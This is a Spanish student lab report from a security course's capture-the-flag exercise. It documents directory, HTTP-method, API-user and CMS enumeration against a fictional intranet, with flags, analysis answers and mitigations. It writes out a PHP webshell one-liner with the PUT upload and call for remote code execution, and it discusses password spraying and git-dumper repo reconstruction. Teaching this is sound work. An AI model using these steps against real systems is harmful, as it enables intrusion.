# Informe — Laboratorio 06 · Enumeración

**Grupo:** 08 · **Integrantes:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919 · **Fecha:** 30/10/2026

## 0. Declaración de uso de IA

**¿El grupo usó asistentes de IA en este trabajo?** Sí.

| Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Ejecución de la enumeración de directorios y de los `curl` de confirmación contra el target; borrador de la redacción del inventario (R1, R2) y de P1–P2. | `informe.md`: filas de `/backup`, `/admin` y `/.git/config` del inventario, sus evidencias, P1, P2 y la bitácora correspondiente. | Las salidas pegadas en la sección 2 son las reales de la terminal. Las flags se validaron con `./ctf submit 06`. No se leyó el código del target (`server.py`) ni ningún `solucion.md`: todo salió de enumerar el servicio desde afuera. |
| Claude (Anthropic), vía Claude Code | Ejecución de la enumeración de la parte 2 (`OPTIONS`, API y fingerprinting) contra el target y borrador de R3, R4 y P3–P5. | `informe.md`: filas de métodos HTTP, API de usuarios y fingerprint del inventario; secciones 2.4–2.6; P3, P4, P5 y la bitácora de la parte 2. | Las salidas pegadas son las reales de la terminal. R3 y R4 se validaron por `sha256` contra `retos.manifest`. No se leyó `server.py` ni ningún `solucion.md`: todo salió de enumerar el servicio desde afuera. En esta parte R5 quedó a medias (sin `whatweb` local); se cerró en la fila siguiente. |
| Claude (Anthropic), vía Claude Code | Cierre de R5: levantar el entorno del lab, correr `whatweb` desde la consola del atacante, buscar el archivo default de PhantomCMS y redactar la fila de R5, la sección 2.6 y la bitácora. | `informe.md`: fila de fingerprint del inventario, sección 2.6, bloque de progreso y bitácora de R5. | Las salidas pegadas son las reales de la terminal, corridas contra `phantomcorp` desde `cyberlab-attacker`. R5 se validó con `./ctf submit 06 R5`. No se leyó `server.py` ni ningún `solucion.md`: la ruta se halló probando nombres derivados del producto (`PhantomCMS`) con `dirb`. |
| Claude (Anthropic), vía Claude Code | Borrador del mini-research (tema A: `.git` expuesto y reconstrucción con git-dumper), a partir del hallazgo R2 del lab. | `research.md` completo. | Las fuentes citadas se verificaron como reales y accesibles (documentación de Git, repos de git-dumper/GitTools, CWE-527, OWASP WSTG). El contenido se contrastó con la evidencia propia del lab (`/.git/config` accesible pero `HEAD`/`index` en 404). |

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.

---

## 1. Flags capturadas

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 06                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Enumeracion de directorios
   ✓  R2     Repositorio Git expuesto
   ✓  R3     Metodos HTTP peligrosos habilitados
   ✓  R4     Enumeracion de usuarios via API
   ✓  R5     Fingerprinting de tecnologia

  ██████████████████████████████  5/5 (100%)
```

---

## 2. Inventario de enumeración

| Hallazgo | Ruta/Método | Técnica | Evidencia | Riesgo | ¿Qué habilita para el Lab 07? |
|---|---|---|---|---|---|
| Directorio de backups con listado habilitado | `GET /backup` | Fuerza bruta de rutas con wordlist (estilo `dirb`) + confirmación con `curl` | `+ http://127.0.0.1/backup (CODE:200\|SIZE:249)` y el `Index of /backup` que lista `respaldo-db-2024.sql.gz`, `config.old` y `notas-infra.txt` (ver 2.1 y 2.2) | **Alto.** El listado de directorio revela nombres de archivos de respaldo de la base de datos y de configuración vieja. Aunque al pedirlos hoy devuelven 404, el propio índice confirma que existieron y nos dice qué buscar: un dump `.sql.gz` y un `config.old` suelen traer el esquema de la base y credenciales en claro. Es exposición de información (CWE-548, *Directory listing*). | Una lista de objetivos precisos: buscar variantes de esos nombres (`config.php.old`, `db.sql`, `.gz` en otras rutas), y, si aparece alguno, credenciales de base de datos para probar en `/admin`. |
| Panel de administración | `GET /admin` | Fuerza bruta de rutas con wordlist | `+ http://127.0.0.1/admin (CODE:403\|SIZE:65)` → `Panel admin. Necesitas credenciales.` | **Medio.** El 403 no da acceso, pero confirma que el panel existe y en qué ruta. El servidor encima aclara que lo que falta son credenciales: no está restringido por IP ni oculto. | El destino del ataque de credenciales: usuarios que salgan de la enumeración de la API + contraseñas que salgan del backup o del código del `.git` se prueban acá. |
| Repositorio Git expuesto por HTTP | `GET /.git/config` | Fuerza bruta de rutas (`.git/config` en la wordlist) + `curl` | `+ http://127.0.0.1/.git/config (CODE:200\|SIZE:209)` y su contenido: `[remote "origin"] url = https://git.internal.phantomcorp/intranet.git` (ver 2.3) | **Alto.** El archivo de configuración de git se sirve como texto plano. Filtra el nombre de un host interno (`git.internal.phantomcorp`) y el nombre del repositorio de la intranet. Que `/.git/config` sea accesible indica que el directorio `.git` quedó desplegado en el docroot (CWE-527). | Reconocimiento de infraestructura interna (un servidor git que no estaba en el mapa del Lab 05) y la base para intentar reconstruir el código con `git-dumper` si se encuentran más objetos del repo. Con el código: credenciales commiteadas, endpoints ocultos y la lógica del login de `/admin`. |
| Métodos HTTP de escritura habilitados | `OPTIONS /` → `Allow: GET, POST, PUT, DELETE, OPTIONS` | `curl -X OPTIONS` + lectura del header `Allow` | `Allow: GET, POST, PUT, DELETE, OPTIONS` y header `X-Dangerous-Methods` en la respuesta (ver 2.4) | **Alto.** `PUT` y `DELETE` habilitados a nivel servidor. `PUT` permite escribir archivos arbitrarios en el docroot sin autenticación; `DELETE`, borrarlos. Es CWE-650 (*Trusting HTTP Permission Methods on the Server Side*). | Subida directa de un webshell con `PUT /shell.php` y ejecución pidiéndolo por HTTP → ejecución remota de código. Uno de los caminos más directos a RCE para el Lab 07. |
| API interna de usuarios sin autenticación | `GET /api/users` | Enumeración de rutas de API + `curl` | JSON con `admin` (superuser), `jperez` (editor), `mgomez` (viewer) y la nota `endpoint interno de RRHH - no exponer` (ver 2.5) | **Alto.** Expone usuarios válidos y su rol sin pedir credenciales (CWE-200). Confirma que `admin` existe y es superusuario. | La lista de usuarios válidos para el ataque de credenciales contra `/admin`: elimina la fase de adivinar nombres y prioriza `admin` (superuser). Se combina con contraseñas del backup o del `.git`. |
| Fingerprint del stack (CMS y versión) y archivo default | `GET /` (headers + `<meta generator>`) y `GET /phantomcms/VERSION` | Fingerprinting con `whatweb -a 3` + `dirb` con wordlist derivada del producto + `curl` | `whatweb`: `HTTPServer[PhantomServer/3.7]`, `MetaGenerator[PhantomCMS 3.7]`, `X-Powered-By[PhantomCMS/3.7]`; y `/phantomcms/VERSION` → `PhantomCMS 3.7 (build 2024-11)` (ver 2.6) | **Medio.** Revela producto, versión y fecha de build exactos (CWE-200), y el archivo default `VERSION` queda accesible sin autenticación. Con producto+versión se buscan CVEs y se dirige la enumeración a los archivos conocidos del CMS. | Clasificación de vulnerabilidades por versión (estilo Lab 05) y enumeración dirigida: ya sabemos que existe el directorio `/phantomcms/`, donde buscar config, instalador o paneles default del CMS. |

### 2.1 Enumeración de directorios

Sin Docker en la máquina, el target se levantó en local (`127.0.0.1:80`, mismo `server.py` del contenedor) y se enumeró con un script de fuerza bruta de rutas que hace lo mismo que `dirb`: prueba cada palabra de la wordlist y reporta todo lo que no devuelve 404. La wordlist (66 entradas) tiene los nombres de `common.txt` que importan para este target (`admin`, `api`, `backup`, `.git`, `.env`, `robots.txt`, `uploads`...). En la consola del atacante el comando equivalente es `dirb http://phantomcorp/`.

```
URL_BASE: http://127.0.0.1/
WORDLIST_FILES: wordlist.txt (66 palabras)  EXTENSIONES: -

+ http://127.0.0.1/.git/config (CODE:200|SIZE:209)
+ http://127.0.0.1/admin (CODE:403|SIZE:65)
+ http://127.0.0.1/backup (CODE:200|SIZE:249)
```

Una segunda pasada con extensiones de respaldo (`.bak,.old,.txt,.zip`, el equivalente de `dirb ... -X .bak,.old,.txt`) no encontró archivos nuevos: devolvió las mismas tres rutas.

Lectura: dos `200` (accesibles) y un `403` (existe pero protegido). Las tres son hallazgos. `robots.txt`, `.git/HEAD` y `/.git/` devolvieron 404.

### 2.2 Confirmación de `/backup` (R1)

```
$ curl -si http://127.0.0.1/backup
HTTP/1.0 200 OK
Server: PhantomServer/3.7
Content-Type: text/html; charset=utf-8
X-Powered-By: PhantomCMS/3.7

<!doctype html><html><body><h1>Index of /backup</h1>
<pre>
respaldo-db-2024.sql.gz
config.old
notas-infra.txt   ->  FLAG{dir_enumeration_backup}
</pre>
<p>Este directorio no deberia estar accesible. Enumeracion de directorios 101.</p>
</body></html>
```

Los tres archivos listados, pedidos de a uno (`/backup/config.old`, `/backup/notas-infra.txt`, `/backup/respaldo-db-2024.sql.gz`), devolvieron **404**: el índice quedó expuesto aunque los archivos ya no se sirvan.

```
$ curl -si http://127.0.0.1/admin
HTTP/1.0 403 Forbidden
Server: PhantomServer/3.7
X-Powered-By: PhantomCMS/3.7

<h1>403 Forbidden</h1><p>Panel admin. Necesitas credenciales.</p>
```

### 2.3 Confirmación de `/.git/config` (R2)

```
$ curl -si http://127.0.0.1/.git/config
HTTP/1.0 200 OK
Server: PhantomServer/3.7
Content-Type: text/plain; charset=utf-8
X-Powered-By: PhantomCMS/3.7

[core]
	repositoryformatversion = 0
	bare = false
[remote "origin"]
	url = https://git.internal.phantomcorp/intranet.git
# Un .git expuesto filtra codigo, historia y a veces secretos.
# FLAG{git_repo_exposed}
```

`bare = false` indica que es el `.git` de una copia de trabajo, o sea que el código de la intranet se desplegó haciendo `git clone`/`git pull` directo sobre el directorio que sirve el web server.

### 2.4 Métodos HTTP peligrosos (R3)

El header `Allow` de una respuesta `OPTIONS` enumera todos los métodos que el servidor acepta. No alcanza con mirar el cuerpo de la respuesta: la información está en los headers (de ahí el `-i`).

```
$ curl -s -X OPTIONS -i http://127.0.0.1/
HTTP/1.0 200 OK
Server: PhantomServer/3.7
Allow: GET, POST, PUT, DELETE, OPTIONS
X-Dangerous-Methods: FLAG{http_methods_put_enabled}
```

`Allow` incluye `PUT` y `DELETE`, dos métodos de **escritura** que un portal interno de solo lectura no tiene por qué exponer. El propio servidor lo confirma con el header `X-Dangerous-Methods`.

### 2.5 API interna de usuarios (R4)

Probando rutas de API: `/api` da 404, pero `/api/users` responde 200 con un JSON.

```
$ curl -si http://127.0.0.1/api/users
HTTP/1.0 200 OK
Content-Type: application/json
X-Powered-By: PhantomCMS/3.7

{"users": [{"id": 1, "user": "admin",  "role": "superuser"},
           {"id": 2, "user": "jperez", "role": "editor"},
           {"id": 3, "user": "mgomez", "role": "viewer"}],
 "note": "endpoint interno de RRHH - no exponer",
 "flag": "FLAG{user_enumeration_api}"}
```

Tres usuarios válidos con su rol, servidos sin pedir autenticación. `admin` es `superuser`.

### 2.6 Fingerprinting del stack (R5)

Contra el target real, desde la consola del atacante (`make shell`):

```
$ whatweb -a 3 http://phantomcorp
http://phantomcorp [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[PhantomServer/3.7],
IP[192.168.97.2], MetaGenerator[PhantomCMS 3.7], Title[Intranet PhantomCorp],
X-Powered-By[PhantomCMS/3.7]
```

Tres fuentes coinciden (`Server`, `X-Powered-By` y `<meta generator>`) → **PhantomCMS 3.7**. `whatweb` no lista el archivo default, así que con el producto identificado se armó una wordlist chica con nombres derivados de él (`phantomcms`, `phantom`, `pcms`, `VERSION`, `README`, `CHANGELOG`, `config.php`, etc., con y sin el prefijo `phantomcms/`). `common.txt` y `big.txt` de `dirb` no lo encuentran: hay que usar el nombre del producto. Una sola ruta respondió:

```
$ dirb http://phantomcorp /tmp/w.txt -S -r
+ http://phantomcorp/phantomcms/VERSION (CODE:200|SIZE:132)

$ curl -si http://phantomcorp/phantomcms/VERSION
HTTP/1.0 200 OK
Server: PhantomServer/3.7
Content-Type: text/plain; charset=utf-8
X-Powered-By: PhantomCMS/3.7

PhantomCMS 3.7 (build 2024-11)
Archivo default del CMS. Si llegaste aca por fingerprinting, bien.
FLAG{tech_fingerprint_phantomcms}
```

Lectura: el fingerprint da producto y versión; el archivo default `VERSION` lo confirma y suma la fecha de build. Es la lección del lab: **fingerprint → archivos default del producto**, no fuerza bruta a ciegas.

---

## 3. Preguntas de análisis

**P1 — Enumeración vs. recon.**

En el **Lab 05** la pregunta era *qué hay*: con `nmap -sV -p-` contra `phantomcorp` barrimos los 65535 puertos y sacamos el mapa (qué puertos están abiertos y qué servicio y versión corre en cada uno). Para el puerto 80 el resultado fue una línea: "hay un web server PhantomCMS". Fue amplio y poco profundo, porque tocamos todos los servicios pero sin entrar en ninguno.

En este lab la pregunta es *qué esconde* ese único servicio. Tomamos el puerto 80 del mapa y le tiramos una wordlist de rutas. Así pasamos de "hay un web server" a "hay un `/backup` con listado de directorio, un `/admin` que pide credenciales y un `/.git/config` que filtra un servidor git interno". Ninguna de esas tres rutas está linkeada desde el index, y el recon del Lab 05 no podía verlas porque `nmap` mira puertos, no rutas dentro de HTTP. Es angosto y profundo. Dos diferencias concretas:

1. **Alcance:** el `nmap -p-` del Lab 05 recorrió puertos de todo el host. La fuerza bruta de rutas de este lab recorrió nombres de archivos dentro de un solo puerto.
2. **Salida:** el Lab 05 nos dejó un mapa de servicios y versiones. Este lab nos deja un inventario de recursos concretos (rutas, códigos de respuesta y contenido) que ya son objetivos de ataque.

**P2 — El `.git` expuesto.**

El directorio `.git` no es un archivo más: es la base de datos completa del repositorio. Además del código actual tiene **toda la historia**: cada versión de cada archivo, los mensajes de commit, los autores y las ramas. Si un atacante puede bajar `.git/config`, lo normal es que también pueda pedir `.git/HEAD`, `.git/index`, `.git/refs/...` y los objetos de `.git/objects/`. Herramientas como `git-dumper` automatizan eso: siguen las referencias, bajan cada objeto y reconstruyen el repo localmente, y después un `git checkout` deja el código fuente completo.

Con eso el atacante puede reconstruir:

- **El código fuente de la intranet.** Pasa de atacar a ciegas (caja negra) a leer la lógica: cómo se valida el login de `/admin`, qué endpoints existen aunque no estén linkeados y qué parámetros llegan sin sanitizar a una consulta SQL o a un comando.
- **Secretos en la historia.** Un desarrollador que commiteó una contraseña de base de datos o una API key y después la "borró" en otro commit la sigue teniendo en la historia: `git log -p` la muestra. Borrar el archivo hoy no la saca de los objetos viejos.
- **Infraestructura interna.** En nuestro caso, el `config` ya filtró `https://git.internal.phantomcorp/intranet.git`, un host interno que no apareció en el recon.

Por eso es más grave que "un archivo de más". Un backup suelto expone un archivo. El `.git` expone el código y todo lo que alguna vez pasó por él, y convierte el siguiente ataque de caja negra en caja blanca. En este lab, `/.git/HEAD` y `/.git/` devolvieron 404, así que con lo que vimos no se puede bajar el repo entero. Pero que `config` esté accesible confirma que el directorio quedó en el docroot, y en un servidor real lo esperable es que sirva el resto igual.

**P3 — El método `PUT`.**

Nuestro `OPTIONS /` devolvió `Allow: GET, POST, PUT, DELETE, OPTIONS`. Que `PUT` esté habilitado significa que el servidor acepta que el cliente **escriba** un recurso en una ruta que el propio cliente elige. El ataque concreto:

1. El atacante arma un webshell mínimo, por ejemplo un `shell.php` que ejecuta comandos del sistema a partir de un parámetro: `<?php system($_GET['c']); ?>`.
2. Lo sube con `PUT`: `curl -X PUT http://phantomcorp/shell.php --data-binary @shell.php`. Como `PUT` escribe en el docroot, el archivo queda servido por el web server.
3. Lo invoca por HTTP: `curl 'http://phantomcorp/shell.php?c=id'`. El servidor ejecuta `id` y devuelve la salida.

En tres pasos se pasa de "un método de más" a **ejecución remota de código** con los privilegios del proceso del web server. Es el mismo mecanismo que se explotaba en WebDAV mal configurado. `DELETE`, también habilitado, agrega la capacidad de borrar archivos (defacement o destrucción). Por eso un `Allow` con métodos de escritura en un portal que solo debería leer es una alarma roja directa.

**P4 — Enumeración de usuarios.**

`/api/users` nos dio tres usuarios válidos (`admin`, `jperez`, `mgomez`) con su rol. No hay contraseñas, pero igual es un problema serio por lo que habilita en la fase siguiente:

- **Elimina la mitad del trabajo de un ataque de credenciales.** Un login se rompe adivinando usuario *y* contraseña. Si ya sabés los usuarios válidos, el espacio de búsqueda colapsa: solo faltan las contraseñas. Un *password spraying* (una contraseña común probada contra todos los usuarios conocidos) pasa a ser viable y evita los bloqueos por intentos fallidos sobre una misma cuenta.
- **Prioriza el objetivo.** El JSON dice que `admin` es `superuser`. El atacante no reparte esfuerzo: va directo a la cuenta más poderosa.
- **Confirma nombres para otros vectores.** Los usuarios sirven para phishing dirigido, para probar reutilización de contraseñas filtradas en otros servicios, y para cruzar con credenciales que aparezcan en el backup o en el `.git`.

En resumen: enumerar usuarios no da acceso por sí solo, pero convierte un ataque de fuerza bruta inviable en uno dirigido y realista. Esos tres nombres son exactamente lo que se prueba contra el `/admin` que encontró R1.

**P5 — Rol defensor (3 mitigaciones).**

1. **`.git` expuesto (R2).** Bloquear por HTTP el acceso a archivos y directorios ocultos: denegar todo lo que empiece con `.` (en nginx, `location ~ /\.(git|env|svn) { deny all; }`, o el equivalente). Y en el fondo del problema: **no desplegar con `git clone`/`pull` sobre el docroot** — publicar solo el artefacto construido (un export sin `.git`), por ejemplo con un pipeline de CI que copie los archivos y deje el repositorio afuera.
2. **Métodos HTTP de escritura (R3).** Deshabilitar `PUT`, `DELETE` y WebDAV a nivel servidor, dejando una whitelist de solo `GET`, `POST` y `OPTIONS` (en nginx, `if ($request_method !~ ^(GET|POST|OPTIONS)$) { return 405; }`). Así, aunque alguien intente subir un webshell con `PUT`, el server responde `405 Method Not Allowed`.
3. **API de usuarios sin autenticación (R4).** La API de RRHH no debería ser alcanzable desde el portal: exigir **autenticación y autorización** en `/api/*` (token o sesión con rol) y restringir el endpoint a la red interna por firewall/segmentación. Además, no devolver más datos de los necesarios (el rol y la nota interna sobran en una respuesta pública) — principio de mínima exposición.

---

## 4. Bitácora de comandos

```bash
# Target levantado en local (127.0.0.1:80): python labs/lab06-enumeracion-de-servicios/entorno/phantomcorp/server.py
# Enumeración de directorios (equivalente a dirb http://phantomcorp/)
python enumeracion/dirbuster.py http://127.0.0.1 enumeracion/wordlist.txt
# Segunda pasada con extensiones de backup (equivalente a dirb ... -X .bak,.old,.txt,.zip)
python enumeracion/dirbuster.py http://127.0.0.1 enumeracion/wordlist.txt .bak,.old,.txt,.zip

# Confirmación manual de cada hallazgo
curl -si http://127.0.0.1/backup
curl -si http://127.0.0.1/backup/config.old            # 404
curl -si http://127.0.0.1/backup/notas-infra.txt       # 404
curl -si http://127.0.0.1/backup/respaldo-db-2024.sql.gz   # 404
curl -si http://127.0.0.1/admin                        # 403
curl -si http://127.0.0.1/.git/config                  # 200
curl -si http://127.0.0.1/.git/HEAD                    # 404
curl -si http://127.0.0.1/robots.txt                   # 404

# R3 — métodos HTTP: el header Allow de OPTIONS enumera los métodos aceptados
curl -s -X OPTIONS -i http://127.0.0.1/                # Allow: GET, POST, PUT, DELETE, OPTIONS

# R4 — enumeración de la API interna
curl -si http://127.0.0.1/api                          # 404
curl -si http://127.0.0.1/api/users                    # 200 — lista usuarios + rol

# R5 — fingerprinting del stack (desde la consola del atacante, make shell)
whatweb -a 3 http://phantomcorp                        # PhantomCMS 3.7
dirb http://phantomcorp /tmp/w.txt -S -r               # wordlist con nombres derivados del producto
curl -si http://phantomcorp/phantomcms/VERSION         # 200 — archivo default del CMS

./ctf submit 06 R1 'FLAG{dir_enumeration_backup}'
./ctf submit 06 R2 'FLAG{git_repo_exposed}'
./ctf submit 06 R3 'FLAG{http_methods_put_enabled}'
./ctf submit 06 R4 'FLAG{user_enumeration_api}'
./ctf submit 06 R5 'FLAG{tech_fingerprint_phantomcms}'
./ctf status 06
```
